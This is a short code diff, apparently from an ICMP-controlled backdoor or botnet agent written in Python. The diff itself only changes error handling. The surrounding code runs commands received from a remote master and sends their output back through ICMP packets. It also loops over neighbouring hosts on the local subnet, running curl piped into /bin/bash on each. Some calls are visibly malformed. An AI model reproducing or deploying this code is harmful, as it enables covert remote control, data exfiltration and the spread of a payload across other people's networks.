@@ -26,7 +26,7 @@ class Handler(threading.Thread):
                 #<command here>------>arg1 arg2 arg3
                 #OTHERWISE COMMANDS WILL JUST BE EXECUTED AND THEIR OUTPUT RETURNED
 	
-		raw = self.q.get()
+		raw = self.q.get(True)
 		print(raw)
 		if raw != None:
 		
@@ -48,7 +48,7 @@ class Handler(threading.Thread):
 							if i != octets[3]:
 								try:
 									os.system("curl ", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i)+ "|/bin/bash")
-								except subprocess.CalledProcessError as e:
+								except Exception as e:
 									pass	
 				else:
 					print self.passwd
@@ -60,7 +60,8 @@ class Handler(threading.Thread):
 						os.system("rm -f /tmp/tmp.dat")
 						print("OUT: "+str(out))
 						send_icmp(localhost, self.master, localhost+">>\n"+out)
-					except subprocess.CalledProcessError as e:
+					except Exception as e:
+						print(e)
 						send_icmp(localhost, self.master, localhost+">>\nERROR")
 	
 def init():
